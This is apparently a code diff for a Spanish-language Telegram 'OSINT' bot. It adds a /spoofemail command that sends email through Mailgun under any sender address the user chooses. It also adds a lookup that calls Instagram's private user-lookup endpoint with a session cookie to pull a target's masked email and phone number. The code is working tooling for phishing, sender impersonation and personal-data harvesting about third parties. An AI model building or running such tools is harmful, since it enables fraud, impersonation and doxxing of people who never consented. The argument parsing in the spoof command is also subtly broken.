@@ -1,12 +1,13 @@
 import os
 import requests
 import json
-import asyncio
 from urllib.parse import quote_plus
 from pyrogram import Client, filters
-from pyrogram.errors import FloodWait
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from dotenv import load_dotenv
+import phonenumbers
+from phonenumbers.phonenumberutil import region_code_for_country_code
+import pycountry
 
 # Cargar variables de entorno
 load_dotenv()
@@ -14,7 +15,7 @@ load_dotenv()
 API_ID = int(os.getenv("API_ID"))
 API_HASH = os.getenv("API_HASH")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
-SESSION_ID = os.getenv("SESSION_ID")
+SESSION_ID = os.getenv("SESSION_ID")  # Cargar SESSION_ID desde .env
 MAILGUN_API_KEY = os.getenv("MAILGUN_API_KEY")
 MAILGUN_DOMAIN = os.getenv("MAILGUN_DOMAIN")
 
@@ -26,7 +27,19 @@ app = Client(
     bot_token=BOT_TOKEN
 )
 
-user_states = {}
+# Función para enviar correos electrónicos falsificados con Mailgun
+def send_spoofed_email(from_email, to_email, subject, message):
+    url = f"https://api.mailgun.net/v3/{MAILGUN_DOMAIN}/messages"
+    auth = ("api", MAILGUN_API_KEY)
+    data = {
+        "from": from_email,
+        "to": to_email,
+        "subject": subject,
+        "text": message
+    }
+
+    response = requests.post(url, auth=auth, data=data)
+    return response.json()
 
 # Función para obtener datos de Instagram
 def get_instagram_info(username, session_id):
@@ -43,91 +56,56 @@ def get_instagram_info(username, session_id):
     if not user_data:
         return {"error": "No se pudo obtener información del usuario"}
     
+    user_id = user_data.get("id", "Desconocido")
+    obfuscated_info = advanced_lookup(username, session_id)
+    
     return {
         "username": user_data.get("username", "No disponible"),
         "full_name": user_data.get("full_name", "No disponible"),
-        "user_id": user_data.get("id", "Desconocido"),
+        "user_id": user_id,
         "followers": user_data.get("edge_followed_by", {}).get("count", "No disponible"),
         "is_private": user_data.get("is_private", False),
         "bio": user_data.get("biography", "No disponible"),
-        "profile_picture": user_data.get("profile_pic_url_hd", "No disponible")
+        "profile_picture": user_data.get("profile_pic_url_hd", "No disponible"),
+        "public_email": user_data.get("public_email", "No disponible"),
+        "public_phone": user_data.get("public_phone_number", "No disponible"),
+        "obfuscated_email": obfuscated_info.get("obfuscated_email", "No disponible"),
+        "obfuscated_phone": obfuscated_info.get("obfuscated_phone", "No disponible"),
     }
 
-# Enviar email spoof usando Mailgun
-def send_spoof_email(to_email, from_email, subject, message):
-    url = f"https://api.mailgun.net/v3/{MAILGUN_DOMAIN}/messages"
-    auth = ("api", MAILGUN_API_KEY)
-    data = {
-        "from": from_email,
-        "to": to_email,
-        "subject": subject,
-        "text": message
+# Función para obtener datos de correo y teléfono ocultos
+def advanced_lookup(username, session_id):
+    data = "signed_body=SIGNATURE." + quote_plus(json.dumps({"q": username, "skip_recovery": "1"}))
+    headers = {
+        "User-Agent": "Instagram 101.0.0.15.120",
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
     }
-    response = requests.post(url, auth=auth, data=data)
-    return response.json()
-
-# Menú principal
-def main_menu():
-    botones = [
-        [InlineKeyboardButton("🔎 Buscar usuario de Instagram", callback_data="search_user")],
-        [InlineKeyboardButton("📧 Email Spoof", callback_data="email_spoof")],
-        [InlineKeyboardButton("🔑 Cambiar SESSION_ID", callback_data="change_session")]
-    ]
-    return InlineKeyboardMarkup(botones)
-
-@app.on_message(filters.command("start"))
-async def start(client, message):
-    user_states[message.chat.id] = None
-    await message.reply_text(
-        "🌟 Bienvenido al bot OSINT! 🔍\nSelecciona una opción:",
-        reply_markup=main_menu()
-    )
-
-@app.on_callback_query(filters.regex("search_user"))
-async def search_user(client, callback_query):
-    user_states[callback_query.message.chat.id] = "search_user"
-    await callback_query.message.edit_text("🔍 Envíame el **nombre de usuario** de Instagram.")
-
-@app.on_callback_query(filters.regex("email_spoof"))
-async def email_spoof(client, callback_query):
-    user_states[callback_query.message.chat.id] = "email_spoof"
-    await callback_query.message.edit_text("📧 Envíame el correo del destinatario.")
-
-@app.on_callback_query(filters.regex("change_session"))
-async def change_session(client, callback_query):
-    user_states[callback_query.message.chat.id] = "change_session"
-    await callback_query.message.edit_text("🔑 Envíame el nuevo SESSION_ID.")
-
-@app.on_message(filters.text & filters.private)
-async def handle_user_input(client, message):
-    user_id = message.chat.id
-    state = user_states.get(user_id)
+    response = requests.post("https://i.instagram.com/api/v1/users/lookup/", headers=headers, data=data, cookies={"sessionid": session_id})
     
     try:
-        if state == "search_user":
-            username = message.text.strip()
-            await message.reply_text("🔍 Buscando información...")
-            data = get_instagram_info(username, SESSION_ID)
-            if "error" in data:
-                await message.reply_text(f"❌ Error: {data['error']}")
-            else:
-                info_msg = f"📌 **Usuario:** {data['username']}\n📛 **Nombre:** {data['full_name']}\n🆔 **ID:** {data['user_id']}\n👥 **Seguidores:** {data['followers']}\n🔒 **Privado:** {'Sí' if data['is_private'] else 'No'}\n📝 **Bio:** {data['bio']}"
-                await message.reply_photo(photo=data['profile_picture'], caption=info_msg)
-            user_states[user_id] = None
-        
-        elif state == "change_session":
-            global SESSION_ID
-            SESSION_ID = message.text.strip()
-            os.environ["SESSION_ID"] = SESSION_ID
-            await message.reply_text(f"✅ Nuevo SESSION_ID guardado.")
-            user_states[user_id] = None
-        
-        else:
-            await message.reply_text("⚠️ Opción no válida. Usa /start para volver al menú.")
+        return response.json()
+    except json.JSONDecodeError:
+        return {"error": "Rate limit"}
+
+# Comando para enviar correos falsificados
+@app.on_message(filters.command("spoofemail") & filters.private)
+async def spoof_email(client, message):
+    args = message.text.split(" ", 3)
+    if len(args) < 4:
+        await message.reply_text("Uso: `/spoofemail remitente destinatario asunto mensaje`")
+        return
     
-    except FloodWait as e:
-        await asyncio.sleep(e.value)
-        await message.reply_text("⚠️ Se ha detectado un exceso de solicitudes. Esperando...")
+    from_email = args[1]
+    to_email = args[2]
+    subject = args[3]
+    message_text = " ".join(args[4:])
+
+    response = send_spoofed_email(from_email, to_email, subject, message_text)
+
+    if response.get("message") == "Queued. Thank you.":
+        await message.reply_text(f"✅ Correo enviado con éxito de {from_email} a {to_email}.")
+    else:
+        await message.reply_text(f"❌ Error al enviar el correo: {response}")
 
 # Ejecutar el bot
 if __name__ == "__main__":
